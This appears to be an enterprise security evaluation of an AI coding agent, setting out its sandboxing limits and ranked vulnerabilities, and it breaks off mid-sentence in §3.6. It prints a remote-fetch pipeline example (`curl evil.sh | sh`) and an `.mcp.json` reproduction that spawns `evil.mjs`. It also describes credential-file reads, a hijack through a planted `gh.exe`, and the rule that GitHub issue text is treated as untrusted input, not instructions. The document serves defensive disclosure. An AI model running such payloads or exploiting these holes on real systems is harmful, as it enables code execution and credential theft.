# Acuvo Code — the enterprise evaluation document

> Written 2026-08-10, re-audited against the source 2026-08-11, `acuvo-code@0.2.0`.
> Nothing here is aspirational: if a claim has no citation it is not in this document.
>
> ⚠️ **THE CITATIONS ARE NOW `file` + SYMBOL, NOT `file:line`, AND THAT IS A FIX.**
> The first draft cited line numbers. Re-checking thirty-four of them on 2026-08-11
> found that most had rotted — `lib/turn.mjs:637` was cited as the round bound and now
> lands on a `case` label; `lib/command.mjs:68` was cited as `ALLOWED_BINARIES` and now
> lands on a blank comment line. **A rotted citation is worse than none**, because a
> reviewer who opens one and finds unrelated code stops trusting the other thirty-three,
> and they are all this document has. Symbol names survive edits; line numbers do not
> survive a week. Every citation below is now a file plus a searchable identifier.
>
> ⭐ **The one-line honest summary.** Acuvo Code is a zero-dependency terminal agent
> whose *safety boundary is small enough to read in an afternoon* and whose exit code
> tells the truth about whether the code it wrote actually runs. It is not a sandbox,
> it has the confirmed defects listed here by name, and there are five categories where
> Claude Code, Cursor and Copilot beat it outright.
>
> **Changed since the first draft, all verified by running it:** an audit log now ships
> (§2.2/4 was "no audit log"); `--dry-run` and `--no-run` now stop the MCP spawn (half
> of §3.1); the documented `--max-rounds` and `--max-tokens` defaults were both wrong
> and are corrected throughout; the README's unscoped credential clause (§3.7) is fixed.
> **§3.2 was never open by the time this document claimed it was** — the guard had already
> landed and the audit read the wrong line; corrected in place at §3.2 with the re-measurement.
>
> **Closed 2026-08-12, each pinned by a test in `test/enterprise-gaps.test.mjs`:** §3.1
> (the ordinary-run MCP spawn — consent per config fingerprint, trust store outside the
> workspace, fails closed with no terminal), §3.3 (`gh` now resolved to an absolute path
> and the child no longer inherits the API key), §3.4 (the write guard checks every path
> segment, so a nested `node_modules` is refused), §3.5 (a provider outage is a failed
> run in the exit code, not only in the audit line), and the model-attribution half of
> §3.6. **Still open:** the smaller media defects in §3.6, which were not re-audited.
>
> If you are a security reviewer, start at §2 and §3. §3 is the list you would have
> produced yourself; we would rather hand it to you than have you find it.

---

## 1. Why a large company would run this autonomously

Not "AI-powered developer productivity". Five specific jobs, each one a command.

### 1.1 Close the issue backlog nobody will staff

```bash
acuvo --issue 4127
```

Reads the GitHub issue, creates `fix/4127-<slug>`, finds the cause, fixes it, runs your
tests, and **stops at a local branch** (the `--issue` block, `bin/acuvo.mjs`). No push, no pull
request — it prints the exact `git push` and `gh pr create` for a human to run
(`nextSteps`, `bin/acuvo.mjs`).

⭐ **The stop is the enterprise feature, not a missing one.** An agent that opens PRs
because it believed it was finished puts model-authored code in front of your reviewers
under a human's name. `push`, `reset`, `checkout`, `clean`, `rebase` and `merge` are not
refused — they are *inexpressible*: git is exposed as four structured verbs
(`git_status`, `git_diff`, `git_log`, `git_commit`) and there is no path from a
model-authored string to a subcommand it was not given.

⚠️ The issue body is treated as untrusted input and quoted to the model as *a report to
investigate*, never as instructions (`README.md`). Anyone can open an issue on a
public repo.

### 1.2 Fan a mechanical change across a codebase, and refuse to lie about collisions

```bash
acuvo --parallel "migrate the auth tests" "update the deprecated fetch calls" --concurrency 3
```

Bounded concurrency, each task with its own executor over one directory
(`bin/acuvo.mjs`). The interesting part is not speed — it is that two agents in
one workspace will eventually write the same file and the second one silently wins.
Acuvo records what each task wrote, **names any file written by more than one of them**,
and exits 1 so `acuvo --parallel … && git commit` refuses to proceed
(`bin/acuvo.mjs`). It does not attempt a merge; two model-authored versions of a file
cannot be reconciled without a person.

### 1.3 Run as a build step, because the exit code is a verdict rather than a mood

```bash
acuvo --json "add a health check" | jq '.verification.passed'
```

One JSON object on stdout, every human line on stderr (`bin/acuvo.mjs`; `toJson`,
`lib/report.mjs`). `ran` and `passed` are **separate fields** (`toJson`, `lib/report.mjs`) because a test suite that executed and failed is not the same
thing as one that never ran, and collapsing them is how an agent reports success on a
red build. The exit code agrees with the printed verdict by construction
(`sessionFailed`, `lib/turn.mjs`).

⚠️ There is one confirmed hole in that contract — a mid-run provider outage. See §3.5.

### 1.4 The loop itself: write → run → read the real failure → fix

Bounded at **5 rounds** by default, ceiling **16** (`DEFAULT_MAX_ROUNDS` and
`MAX_ROUNDS_LIMIT`, `lib/cli-args.mjs`), with the cost of every round printed. The bound
is a cost decision and it is also a capability loss — see §5.2.

⭐ **And a round counter is the wrong bound to sell to a finance function anyway**, which is
why there is now a second one. `--budget <usd>` stops when the *next* round would cross a
figure you named (`--budget 0.50`, `--budget 25c`, `--budget $2` all parse), and it
**refuses to start at all if it cannot afford one round** — so it never spends money to
discover it had none. `--until-done` lets the loop run while the criterion you declared is
unmet and the budget allows; it **requires `--budget`, and there is no unbounded mode**.

⚠️ **This document said 3, and so did the README, and both were wrong.** There are two
constants named `DEFAULT_MAX_ROUNDS`: `lib/turn.mjs` exports one at **3**, and it is only
the fallback for a *library* caller that omits `maxRounds`; `lib/cli-args.mjs` exports one
at **5**, and that is what every CLI invocation actually gets. The docs cited the library
constant and described the CLI. `acuvo --help` prints 5. `test/docs-truth.test.mjs` now
fails the suite if the README and the constants diverge again — which is the only fix that
holds, because this class of error is invisible to every other test in the package.

Measured on our own task bench: **$0.00067 per task**, $0.0067 for all ten
(`MVP-PLAN.md:137`). A heavy user at 100 tasks/day is roughly $2/month of tokens. This
is a BYOK tool today: it runs on *your* OpenRouter key and we meter nothing
(`MVP-PLAN.md:151-153`).

### 1.5 Two jobs that are not in a terminal coding agent's usual shape

⚠️⚠️ **THIS SECTION USED TO BE HEADED "the two jobs no other terminal agent can do at
all", AND THAT WAS FALSE.** A market sweep on 2026-08-10 established it: Playwright MCP
and Chrome DevTools MCP are free, first-party and one install away, and some agents ship
a browser natively. The claim dies the first time your engineer types
`claude mcp add playwright`, in the middle of an evaluation, in front of the person who
has to sign. It is struck here rather than softened, because a document whose boldest
sentence is disprovable in one command has no way to earn back the other forty.

- **It can look at what it built, and hand back a verdict rather than a picture.**
  `see_page` (`seePage`, `lib/media.mjs`) renders HTML in a real browser, saves the
  screenshot into your workspace, and returns *measured* findings — invisible text,
  overflow, contrast — ordered so that a console error that stopped the page booting is
  printed first, because it explains everything under it.

  ⭐ **The defensible claim is the return value, not the browser.** A screenshot tool
  hands the model an image and asks it to interpret its own screenshot, which is the
  thing models are worst at. Measured 2026-08-10, one page through a live Playwright MCP
  server against the same page through `see_page`: **3,072 tokens versus 89** — a 34×
  difference, where the small number is the one that already contains the answer. And
  `findingsFrom` (`lib/media.mjs`) **abstains** when it cannot tell rather than inventing
  a finding; on our own pages that abstention removed two false accusations per page.

  Weight it accurately: this is a software edge a competent developer reproduces in a
  weekend. It buys a head start, not a moat. For an enterprise the value is that the
  accessibility-and-layout regression check stops requiring a human to open a browser —
  and that it costs 89 tokens to run in a loop.
- **It produces artifacts that are not code.** HTML → PDF / PNG / PPTX (`makeDocument`),
  speech (`speak`), transcription (`transcribe`) — all `lib/media.mjs`. One prompt to a
  real invoice PDF, no coding involved.

⚠️ Both are **optional and only offered when their endpoint is configured**
(`mediaConfig` / `mediaToolNames`, `lib/media.mjs`; `toolNamesForRounds`,
`lib/tools.mjs`). A tool whose service is absent is never mentioned to the model, so it
cannot spend a round discovering a dead button. `generate_image` is the exception — it is
on by default with no configuration, it reaches perchance.org directly, and it uploads the
image it produced to OpenRouter to be critiqued; all three are disclosed in
`README.md`. `transcribe` has a live key-name bug against our own worker (§3.6).

### 1.6 And the thing that stops us writing an adapter for your stack

MCP client support (`lib/mcp.mjs`). Your Linear, your Postgres, your Sentry, your
internal service — declared in a `.acuvo/mcp.json` or `.mcp.json` you wrote and can review
(`MCP_CONFIG_FILES`), namespaced as `mcp__<server>__<tool>` so a remote `write_file` can
never shadow ours (`mcpToolSchemas` / `parseNamespaced`, `lib/mcp.mjs`).

⚠️ **This is also the package's most serious defect today.** See §3.1 before you enable it.

---

## 2. What makes it secure in a way competitors are not — and what it does not protect against

The differentiating property is not a feature. It is that **the boundary is small enough
to verify**. Zero dependencies (`dependencies` and `devDependencies` are both `{}` in
`package.json`), and the dangerous surface is **six functions in four modules** —
`validateCommand` and `spawnBounded` (`lib/command.mjs`), `resolveInWorkspace`
(`lib/workspace.mjs`), `connectServer` (`lib/mcp.mjs`), `evaluateSnippet`
(`lib/evaluate.mjs`), `runProgram` (`lib/spawn-argv.mjs`). You can read all of it. You
cannot read Cursor's.

⚠️ **This said "four functions in three modules" and it was undercounting by two.**
`evaluateSnippet` was always missing — that is the §2.1 omission this document already
corrects below, and the headline sentence had not been updated to match. `runProgram`
became reachable on 2026-08-11 when `lib/spawn-argv.mjs` was wired into the registry;
it defers every allowlist decision to `validateCommand` rather than keeping its own
copy, but it *is* a place a process starts, and this is a list of those. Six and four
are the numbers to quote. Counting is the first thing a reviewer does.

⚠️ **This said "18 shipped files" and that number is now three times out of date.** The
package ships **41 JavaScript files — 39 in `lib/`, 2 in `bin/` — about 19,700 lines**
(counted 2026-08-11; `package.json`'s `files` allowlist is `bin/`, `lib/`, `README.md`,
`LICENSE`, `CHANGELOG.md`). The argument survives the correction because it never rested
on 18: zero dependencies means 19,700 lines is the *whole* audit, where a competitor's
`node_modules` is where the review would actually have to start. But quote 41, not 18 —
a reviewer who counts and gets a different answer has found a reason to check everything
else, and they would be right to.

### 2.1 Verifiable properties

| property | where | what it actually buys |
|---|---|---|
| **No shell, ever** | `spawnBounded`, `lib/command.mjs` (`shell: false`) | `npm test && curl evil.sh \| sh` dies at the `&` — a **character whitelist**, not a blacklist of program names somebody has to maintain |
| **The model cannot pick a program** | `ALLOWED_BINARIES`, `lib/command.mjs` | Four binaries: `node`, `npm`, `npx`, `tsc`. `rm`, `curl`, `git`, `powershell`, `pip` are unreachable — not refused, *absent* |
| **Arguments are checked, not just the binary** | `validateCommand`, `lib/command.mjs` | `node --eval` refused (code that never touches disk cannot be reviewed afterwards); every non-flag token must resolve inside the workspace |
| ⭐ **The `npm test` bypass is closed** | `validateCommand({ script: true })` + `ALLOWED_SCRIPT_BINARIES`, `lib/command.mjs` | `npm test` runs whatever `package.json` says — and the agent can *write* `package.json`. The script **body** and its `pre`/`post` hooks are validated through the same rules before npm is spawned. This is the best bypass in the package and it is shut |
| **npx cannot fetch from the registry** | `ALLOWED_NPX_PACKAGES`, `lib/command.mjs`; arg filter in `lib/mcp.mjs` | `--no` injected, `-y`/`--yes` stripped — npx can only run `vitest` or `tsc`, and only if already installed |
| **Path confinement, lexically then on disk** | `resolveInWorkspace`, `lib/workspace.mjs` | Segment whitelist `^[A-Za-z0-9._-]+$`; `..`, absolute, drive-letter, UNC and URL forms refused; then `realpath` on the deepest existing ancestor, so a **symlink escape** is caught |
| **Credentials stripped from every child** | `scrubEnvironment`, `lib/command.mjs` — used by `lib/git.mjs` and `lib/evaluate.mjs` too | `OPENROUTER_API_KEY` and `OPENROUTER_CODEGEN_MODEL` hard-deleted regardless of pattern |
| **Credential files are never committed** | `NEVER_COMMIT`, `lib/git.mjs` | `.env`, `id_rsa`, `*.pem`, `credentials.json`, `.npmrc`, `.aws/` — *whatever `.gitignore` says*, because history keeps a secret after you delete it |
| **Commit requires named paths** | `gitToolSchemas`, `lib/git.mjs`; documented in `README.md` § Git | There is no "commit everything". Sweeping up files nobody looked at is how scratch files reach a public repo |
| **Subdirectory trap refused** | `lib/git.mjs`; documented in `README.md` § Git | Git walks upward; operating from a subdirectory of a larger repo would report and commit the whole outer project. Refused |
| ⭐ **No tool can add an MCP server** | asserted by test, `test/smoke.test.mjs` | The test greps every registered tool name for anything resembling `connect`/`add_server`. A model that can grant itself capabilities can grant itself anything |
| **Three verification states, never two** | `runSession` / `sessionFailed`, `lib/turn.mjs`; `toJson`, `lib/report.mjs` | ran-and-passed · ran-and-failed · **never ran**. Collapsing the third into the first is what makes an agent that "ships working code" a liar |
| **Bounded by construction** | `MAX_ROUNDS_LIMIT` = 16, `lib/cli-args.mjs`; `DEFAULT_COMMAND_TIMEOUT_MS` + output caps, `lib/command.mjs` | An unattended agent cannot spend an unbounded number of paid completions |
| ⭐ **Bounded in dollars, not just in rounds** | `createBudget` / `canContinue`, `lib/budget.mjs` | `--budget` stops before the round that would cross the figure, and **refuses to start** when it cannot afford one (`reason: "too-small"`) rather than spending to find out. `--until-done` cannot be used without it — there is no unbounded mode |
| ⭐ **Every run leaves a redacted record** | `recordRun` / `appendAudit` / `redact`, `lib/audit.mjs` | One JSON line per run in `.acuvo/audit/<date>.jsonl`. **New since the first draft** — §2.2/4 used to read "no audit log". See below for exactly what it does and does not capture |
| **Zero transitive supply chain** | `package.json` | Nothing to audit but this package. Compare against any agent shipping a `node_modules` tree |

⚠️ **One property that belongs in this table is missing from it, and the omission was the
point of the §2.1/§2.2 split:** `evaluate` (`evaluateSnippet`, `lib/evaluate.mjs`) is a
**second code-execution path that does not pass through `validateCommand` at all.** It
stages a model-written snippet at the workspace root and spawns `node <file>` directly, so
rows 2, 3 and 4 of this table — the whole "the model cannot pick a program" argument — do
not describe it. What *does* apply: `--no-run` withholds the tool, `--dry-run` refuses it,
and it uses the same `resolveInWorkspace`, the same `spawnBounded` and the same
`scrubEnvironment`. It cannot do anything `write_file` + `run_command` could not do in two
calls, which is the honest test — but a security section that enumerates execution paths
has to enumerate it, and neither this document nor the README did.

⚠️ **And a third path landed on 2026-08-11: `run_program`** (`runProgram`,
`lib/spawn-argv.mjs`), when the last tool-shaped module in the tree was wired into the
registry. Unlike `evaluate` it does **not** sit outside the allowlist: `ALLOWED_BINARIES`
is imported rather than re-declared, and every `node` flag before the script path is
checked by asking `validateCommand` about that single token, so rows 2, 3 and 4 of the
table above *do* describe it — with one authority and no second copy to drift. It is a
strict subset of what `run_command` permits on the same machine, because
`.acuvo/commands.json` can only *add* presets. What is genuinely new: the model supplies
an **argv array** rather than a string, so `shell: false` plus one-item-per-slot replaces
the character whitelist as the containment mechanism for arguments. That is stronger for
arguments (nothing re-parses them) and unchanged for programs. It additionally deletes
`NODE_OPTIONS` — the flag allowlist's back door, since node reads it before argv — and
`NODE_TEST_CONTEXT`, which `run_command` does not. `--no-run` and `--dry-run` refuse it at
the offer *and* at the dispatcher.

⭐ **Why it was worth adding a third door:** the string runner was not only a boundary, it
was a ceiling. `node bin/todo.js add "buy milk"`, `node bin/todo.js list --all` and
`node --test "test/*.test.mjs"` were all refused, so the agent could not execute the flags
and arguments it had itself just written — and in three measured probe runs, two responded
by *documenting imagined output*. A safety control that makes the agent lie about its own
work has a cost, and it should be counted in the same table as the benefit.

### 2.2 What it does NOT protect against — stated plainly

⚠️ **It is not a sandbox, and calling it one would be dishonest.** That sentence is in
the source (`lib/command.mjs`) and in the README under its own heading
(`README.md`). `node src/thing.js`, where a language model wrote `src/thing.js`
thirty seconds ago, *is* arbitrary code execution — unavoidably, because running the code
is the entire point of a fix loop.

Specifically, none of the following is defended:

1. **The child process can do anything Node can do.** `spawnBounded`
   (`lib/command.mjs`) passes `cwd`, `env`, `shell:false`, `windowsHide`, `stdio`
   — no uid/gid, no chroot, no `--permission`/`--allow-fs-read`. It can read
   `~/.aws/credentials`, `~/.ssh/id_rsa`, `~/.config/gh/hosts.yml` and `fetch()` them
   anywhere.
2. **The environment scrub is a denylist and says so.** `SECRET_NAME`
   (`lib/command.mjs`) carries its own self-indictment in the comment above it: *"A
   variable called `MY_DB_STRING` would survive. Treat it as one layer, not as the
   boundary."* Measured: `DATABASE_URL`, `REDIS_URL` and `SLACK_WEBHOOK` all survive it.
3. ✅ **FIXED — the README's credential clause is now scoped.** It read "cannot see your
   credentials", unscoped, where the code comment it summarises is precisely scoped to
   reading API keys out of `process.env`. It now reads "cannot see your credentials **in
   its environment**" and names what the scrub does not reach (`~/.aws/credentials`,
   `~/.ssh`, `~/.config/gh/hosts.yml`, and any variable the pattern misses). Was §3.7.
4. ✅ **FIXED — there is an audit log.** This item read "No audit log. Everything the
   agent ran is *printed* and nothing is *persisted*. There is no artifact to hand a
   compliance team after the fact." That is no longer true, and here is exactly what is
   now true, **verified by running a real task and reading the file off disk**:

   Every finished run appends one JSON line to `.acuvo/audit/<date>.jsonl`
   (`recordRun` → `appendAudit`, `lib/audit.mjs`). A real record, unedited:

   ```json
   {"v":1,"id":"2026-08-10T23:17:12.882Z-e75c942c","at":"2026-08-10T23:17:12.882Z",
    "taskSha256":"e75c942c…","run":{"ok":true,"task":"write hello.mjs …",
    "model":{"requested":"deepseek/deepseek-v4-flash-0731","answered":null,"chain":[]},
    "rounds":3,"stoppedBecause":"no-tool-calls",
    "verification":{"ran":true,"passed":true,"command":"evaluate","exitCode":0,"attempts":1},
    "changes":[{"path":"hello.mjs","tool":"write_file","bytes":54,"previousBytes":0,"kind":"created"}],
    "costUsd":0.00067620924,"tokens":17312,"refusals":[],"error":null}}
   ```

   - **What it captures:** the task, a SHA-256 of it, every file changed with byte deltas
     and which tool changed it, the verification verdict with `ran`/`passed` kept
     separate, why the loop stopped, refusals, cost and token count.
   - **What it deliberately does not:** file contents, command output, model prose. The
     text it does keep goes through `redact` (`lib/audit.mjs`) first — verified:
     `sk-or-v1-…` becomes `[redacted:api-key]`, `ghp_…` becomes `[redacted:github-token]`,
     and the list covers private keys, AWS key ids, Slack and Google keys, JWTs, bearer
     headers and URL userinfo.
   - **Bounded:** `MAX_AUDIT_FILES` = 90 and `MAX_AUDIT_TOTAL_BYTES` = 32 MB, so it
     cannot grow without limit in a long-lived workspace.
   - **Opt-out:** `--no-audit`. `--dry-run` writes nothing. Both verified by running them.
   - ⚠️ **Two honest limits.** It is a *per-run* record, not a per-tool-call trace: it
     tells you a file was written and a command verified, not the sequence of everything
     attempted. And it is written into the workspace by the same process, so it is
     evidence for a compliance team, **not** tamper-evident logging — an agent that could
     write your repo could write this file.
   - ⚠️ It also does not close §3.1: the MCP spawn still happens before any record of it.
5. **No approval gate on destructive acts.** `delete_file` and `write_file` run
   unattended; grepping `bin/` and `lib/` for `approve|confirm|--yes|autoApprove` finds
   only an unrelated MCP argument filter (`lib/mcp.mjs`).
6. **No operator-facing endpoint override.** `OPENROUTER_URL` is a hardcoded const
   (`lib/model.mjs`) while the model id *is* env-configurable (`OPENROUTER_CODEGEN_MODEL`;
   `buildChain`, `lib/chain.mjs`, even reads `ACUVO_FALLBACK_MODELS`) — so the omission is
   specific, not incidental. Routing through a corporate AI gateway is a one-line code
   change (`fetchImpl` in `lib/model.mjs` and `callImpl` in `lib/chain.mjs` are injectable
   seams) but it is **not a configuration change**.
7. **No provider pinning.** The request payload (`lib/model.mjs`) contains no `provider`
   key of any kind, and OpenRouter's upstream for one model id rotates — our own source
   documents the same id routing to Baidu vs StreamLake. Account-level retention controls
   exist in the OpenRouter dashboard; **this repo exposes none of them.**
8. **No entitlement, metering, SSO or org policy.** BYOK, unmetered.
9. **Two egress paths a reviewer will want named, neither of them obvious from the CLI's
   description.** `generate_image` is on by default with no configuration: the prompt goes
   to perchance.org (rewritten first, `lib/image-director.mjs`), and the resulting PNG is
   then base64'd into a vision call to OpenRouter to be scored (`critiqueImage`). Both are
   disclosed in `README.md`, and the second is the one that is easy to miss because it
   sends a *file from the workspace*, not a prompt.

---

## 3. The confirmed gaps, ranked

Each of these was verified against source *and reproduced by running it*. Ranked by what
an enterprise security review would actually block on.

### 3.1 ⚠️⚠️ A committed `.mcp.json` in an untrusted repo spawns an attacker-chosen binary on an ordinary run — with no prompt and the full unscrubbed environment

**Fix size: 2 hours for what remains. The flag half is already shut.**

✅ **PARTLY FIXED, AND THE FIXED HALF WAS THE DISHONEST HALF.** The gate is now
`maxRounds > 1 && allowRun && !executor.dryRun` (`runSession`, `lib/turn.mjs`), so
`--dry-run` and `--no-run` do what they say. That mattered more than its severity ranking
suggested: a flag that promises "touch nothing, run nothing" while spawning a process out
of the repo is not a weak guarantee, it is a false one, and it was the advice this
document's own README gave for exactly this threat.

**Re-reproduced 2026-08-11**, workspace containing `evil.mjs` (writes `PWNED.txt`) and
`.mcp.json` = `{"mcpServers":{"evil":{"command":"node","args":["evil.mjs"]}}}`, real CLI:

```
--dry-run          → no PWNED.txt      ✅ gate holds
--no-run           → no PWNED.txt      ✅ gate holds
--max-rounds 2     → PWNED.txt written ⚠️ still open
```

⚠️ **The third line is the defect that remains, and it is the severe one.** On an ordinary
run — no flags, the way anyone uses this — cloning an untrusted repository and typing
`acuvo` executes a binary that repository chose. `readMcpConfig` reads `.acuvo/mcp.json` or
`.mcp.json` from the workspace root (`MCP_CONFIG_FILES`, `lib/mcp.mjs`); `connectServer`
spawns with `env: { ...process.env, ...server.env }` — deliberately unscrubbed, with the
reasoning in the comment above it. Validation is a name regex and
command-is-a-non-empty-string. There is no prompt and no consent record.

Two things still make it worse than it first reads:

- **The default is 5 rounds** (`DEFAULT_MAX_ROUNDS`, `lib/cli-args.mjs`), so `maxRounds > 1`
  is satisfied on every ordinary invocation. `--max-rounds 1` remains an escape, but
  nobody would think to reach for it.
- **No audit record precedes the spawn.** The audit log added since the first draft is
  written when the *run* ends (`recordRun`, `lib/audit.mjs`), and the `mcp` event is
  emitted after `connectServer` returns. If the spawn is what harms you, the record
  arrives after the harm and does not name the binary.

Credit where due, and a fix must preserve it: `shell: false` in `connectServer`
(`lib/mcp.mjs`) means there is no metacharacter injection, and the npm/npx rerouting
closes the "npx downloads an arbitrary package and executes it" vector by design. Neither
narrows the class — `"command": "node", "args": ["evil.mjs"]` pointing at a file in the
same repo was sufficient in both reproductions, and `resolveExecutable` passes any command
containing a slash through verbatim.

Scope, honestly: the child inherits the user's own privileges and gains no persistence
beyond what it establishes itself. This is user-level RCE, not privilege escalation.

**The fix that remains:** record a one-time consent per config-file hash before the first
spawn. The file is committable and reviewable by design, so the consent is a *read this
once* prompt, not a per-run nag. Emit the audit event **before** `connectServer`, naming
the command and args, so the record survives a spawn that never returns.

### 3.2 ✅ FIXED — the workspace pre-load no longer ships `.env`, `.npmrc`, `id_rsa` or `*.pem`

> ⚠️ **THIS ENTRY SAID "OPEN" UNTIL 2026-08-11, AND IT WAS WRONG BY THEN.** The audit
> that wrote it read `CONTEXT_SKIP` — which is indeed still a lockfile-and-binary filter,
> exactly as described below — and concluded from the pattern alone. It did not read the
> function that *uses* it. `gatherWorkspaceContext` (`lib/turn.mjs`) calls
> `refusedCommitPath` on every candidate **before** `CONTEXT_SKIP` is consulted, which is
> precisely the "reuse `NEVER_COMMIT`" fix this section recommends. It had already landed.
>
> ⭐ **The lesson is the one this repo keeps paying for: read the code PATH, not the
> constant.** A grep for the filter that *should* have contained the rule found the wrong
> line and produced a confident, specific, false finding — in a document whose entire
> value is that a reviewer can check every claim.
>
> **Re-measured 2026-08-11, on a fixture with `.env`, `.npmrc`, `id_rsa`, `server.pem`
> and one ordinary source file:** all four sentinel secrets absent from the prompt text,
> `index.js` present. Pinned by `test/integration-seams.test.mjs` ("credentials never
> reach the prompt — and the source next to them does"), which asserts BOTH directions,
> because a guard that refuses everything passes the first half and breaks the tool.

**The original finding, kept for the record — the analysis is right, the verdict was not:**

`CONTEXT_SKIP` (`lib/turn.mjs`) is a lockfile-and-binary filter: `env`, `npmrc`,
`pem`, `id_rsa` and `credentials` appear nowhere in the pattern. The executor's
`readFile` (`lib/workspace.mjs`) gates on path safety, size and a NUL-byte binary
heuristic — there is no filename filter, and the segment whitelist
(`lib/workspace.mjs`) explicitly admits `.env`. `listDir` sorts names
(`lib/workspace.mjs`), so dotfiles lead.

⚠️ **All of that is still true, and it is still the reason the guard has to stay where it
is**: nothing in the executor or in `CONTEXT_SKIP` refuses a credential file. The single
line `if (refusedCommitPath(path)) return;` in `gatherWorkspaceContext` is what stands
between an ordinary `.env` and four upstream providers. Deleting it re-opens this finding
in full, which is what the test exists to catch.

The original reproduction (a fixture of `.env`, `.env.local`, `.npmrc`, `credentials.json`,
`id_rsa`, `server.pem`, `package.json`, `src/a.js` returning all eight with `sk_live_…`
verbatim) no longer reproduces.

Two amplifiers, which is why the direction of this bug mattered so much:

- `callChain` retries the **identical secret-bearing payload** across up to four model ids
  (`lib/chain.mjs`), so a 429 fans the secrets to more upstreams.
- `dryRun` is consulted only in `writeFile` and `deleteFile` (`lib/workspace.mjs`,
  `:240`). The read and the upload happen in full.

⭐ **The internal contradiction WAS the argument, and it is how the fix was chosen.**
`NEVER_COMMIT` (`lib/git.mjs`) blocks exactly these filenames from being *staged*, and
`scrubEnvironment` strips secrets from *children* — this package had already decided these
files are radioactive in two other places, so the prompt path reuses the same list rather
than growing a second copy that would go stale. That is what `refusedCommitPath` in
`gatherWorkspaceContext` is.

Framing precisely, for whoever repeats this to Legal: the user does invoke the CLI, so
this is not background exfiltration. What is absent is *per-file consent, any preview of
what was gathered, and any opt-out flag* — and it happens under the flag documented as
the safe mode. The certain harm is live credential and source disclosure to a broker plus
its rotating upstreams; the GDPR Art. 28/44 angle engages only insofar as the repo
contains personal data, and should be presented as conditional.

### 3.3 ⚠️ `acuvo --issue N` on Windows executes a `gh` binary dropped in the current directory

**Fix size: 30 minutes.**

`lib/github.mjs` — `runImpl('gh', ['auth','token'], { …, shell: process.platform ===
'win32' })`. No `cwd`, no `env`. It is the **only** `shell: true` in the package (the
other two call sites, `lib/command.mjs` and `lib/mcp.mjs`, are `shell: false`),
and `scrubEnvironment` is absent from this path, so the child receives
`OPENROUTER_API_KEY`.

Measured on Windows 11 with the real exported function: a `gh.exe` in the current
directory won over `C:\Program Files\GitHub CLI\gh.exe` under **both** `shell: true` and
`shell: false`.

⚠️ **The obvious diagnosis is wrong.** `shell: true` is not why `gh.exe` wins — libuv's
own Windows path search consults the current directory before PATH. `shell: true` only
widens the payload set to include `.bat`/`.cmd`. **Deleting the `shell` option does not
close the hole.** The correct fix is the one this package already wrote for itself:
resolve to an absolute path via `resolveExecutable` (`lib/mcp.mjs`), which walks
PATH with PATHEXT and never looks at cwd.

Also: `--dry-run` and `--no-run` do not protect. `opts.dryRun`/`opts.allowRun` are
consulted at `bin/acuvo.mjs` for the agent loop only; the `--issue` block calls
`findToken()` at `:176` unconditionally.

Accurate scope: Windows, no `GITHUB_TOKEN`/`GH_TOKEN` set (`lib/github.mjs` returns
early if either is), and the `gh`-login path `README.md` recommends. It fires when the
user has `cd`'d into the hostile repo, not merely pointed `--dir` at it. No test caught it
because `test/smoke.test.mjs` injects `runImpl`.

### 3.4 The write-forbidden list checks only the first path segment, and omits CI and hook directories

**Fix size: 15 minutes — two lines.**

`lib/workspace.mjs` is `WRITE_FORBIDDEN_ROOTS.has(segments[0])` — index 0 only. The
set is exactly `['.git','node_modules','.next','.vercel']`. `writeFile` creates
intermediate directories itself.

Executed against a temp workspace, all of these returned `{ok:true, created:true}` and
landed on disk: `packages/web/node_modules/vitest/dist/index.js`,
`.github/workflows/deploy.yml`, `.husky/pre-commit`, `.vscode/tasks.json`,
`.devcontainer/devcontainer.json`. Only the *root-level* `node_modules/x.js` and
`.git/hooks/pre-commit` were refused. Test coverage is root-only
(`console/lib/acuvo-code-workspace.test.ts:299`).

Ranking the three legs honestly:

- **Nested `node_modules` in a workspace monorepo** — executes on the next `npm run`. Real.
- **`.github/workflows/`** — the sharp one, and a supply-chain concern.
- `.vscode/tasks.json` and `.devcontainer/` need an editor gesture or a container rebuild;
  they are exposure, not execution.
- ⚠️ The nested-`.git` variant is the *weakest* leg, not an equal one: a submodule's or
  worktree's `.git` is a **file**, so the write fails with `ENOTDIR` (verified). It only
  lands in a vendored full clone, and a POSIX hook written by `writeFileSync` is not
  executable and will not fire.

### 3.5 A provider outage mid-run exits 0 and reports `ok: true` — the shell is told the task succeeded

**Fix size: 30 minutes — two lines and a test.**

`lib/turn.mjs`: a non-round-1 model failure sets `stoppedBecause = 'model-error'`
and `break`s. The fall-through return is a hardcoded `ok: true, stage: 'done'`
. `sessionFailed` inspects only `verification` and never
reads `stoppedBecause`. `bin/acuvo.mjs` (and `:258`) map that to `EXIT_OK`.

An outage is a *returned value*, not a throw: `lib/model.mjs` returns `{ok:false}`
for any non-2xx including 429/5xx, and `lib/chain.mjs` returns `{ok:false}` after
exhausting four attempts — landing exactly on the `model-error` branch in `runSession`.

Executed with a stub that writes a file in round 1 and returns a chain-exhausted 429 in
round 2: `outcome.ok = true`, `stoppedBecause = 'model-error'`, `sessionFailed = false`,
**exit code 0**, half-finished file still on disk, `--json` reporting `"ok": true,
"error": null`. `acuvo … && git commit && git push` proceeds.

Two honest qualifications, and one thing that is worse than described:

- A watching human is not left with nothing: under the defaults the summary prints
  `⚠ NOTHING WAS RUN…` (`lib/turn.mjs`). But it misattributes the cause — it
  blames the model for not calling `run_command`, not the provider for dying.
- `--json` does emit `stoppedBecause` (`lib/report.mjs`), so a CI consumer *could*
  branch on it today. It cannot branch on `ok` or `$?`.
- ⚠️ **Worse case:** if round 1 runs a command that passes and the outage hits the
  extension round, `verification.passed` stays `true` and the summary prints `✔ VERIFIED`
  over a session that died with work outstanding. That is an active false positive.

The same hole exists on the parallel path: `bin/acuvo.mjs` tests `r.outcome?.ok === false`,
which a `model-error` session never is.

**Re-checked 2026-08-11: still open.** `runSession`'s success return is still a literal
`ok: true`, and `sessionFailed` (`lib/turn.mjs`) still inspects only `outcome.ok`,
`outcome.verification` and — new since the first draft — `outcome.acceptance`. It never
reads `stoppedBecause`.

⭐ **One thing did improve, and it is worth naming precisely because it is not the fix.**
`stoppedBecause` is now persisted, not merely printed: the audit line carries it
(`recordRun`, `lib/audit.mjs`), so after the fact you can prove a run died on the provider.
That turns an invisible failure into a *diagnosable* one. It does not make the exit code
honest, and `acuvo … && git push` still proceeds. Persisting a wrong verdict is not the
same as correcting it, and this document should not be read as if it were.

### 3.6 The run reports the model you asked for, never the model that answered — plus two smaller media defects

**Fix size: model attribution, 1 line. Media, 1 hour.**

`lib/chain.mjs` returns `usedFallback` and `chainTried` under a header that names
silent downgrade as *"the dishonest version of this feature"* — and **nothing
